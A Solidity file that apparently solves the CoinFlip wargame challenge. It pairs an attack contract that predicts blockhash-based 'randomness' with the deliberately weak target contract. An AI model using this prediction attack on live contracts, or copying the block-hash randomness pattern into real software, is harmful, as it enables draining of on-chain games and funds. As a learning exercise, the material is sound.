// SPDX-License-Identifier: MIT
// 0x9AA8C640715232CCd54aA8145be3Abe2041160a0
pragma solidity ^0.8.0;

contract CoinFlipAttack {
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlip private immutable  _flipAddress;

    constructor(address flipAddress) {
        _flipAddress = CoinFlip(flipAddress);
    }

    function attack() public {
        bool _filpV = _flip();
        require(_flipAddress.flip(_filpV), "fail");
    }

    function _flip() private view returns(bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }
}

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}